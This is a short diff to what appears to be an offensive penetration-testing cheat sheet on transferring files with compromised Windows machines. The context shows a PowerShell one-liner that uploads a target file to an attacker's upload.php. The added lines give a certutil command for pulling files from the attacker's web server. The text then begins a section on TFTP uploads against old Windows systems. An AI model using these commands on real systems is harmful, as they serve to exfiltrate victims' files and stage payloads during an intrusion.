@@ -133,6 +133,9 @@ write to that file. Then you can shoot files across the way:
 
 powershell (New-Object System.Net.WebClient).UploadFile(http://IP/upload.php','targetfile')
 
+You can use certutil to grab files from your attacking machine webserver:
+certutil -urlcache -split -f <url> 
+
 TFTP UPLOADS:
 Who the fuck enables FTP anymore? Whatever. If you're attacking XP and 
 Win 2003 you're weird. TFTP is UDP based file transfer so it's already
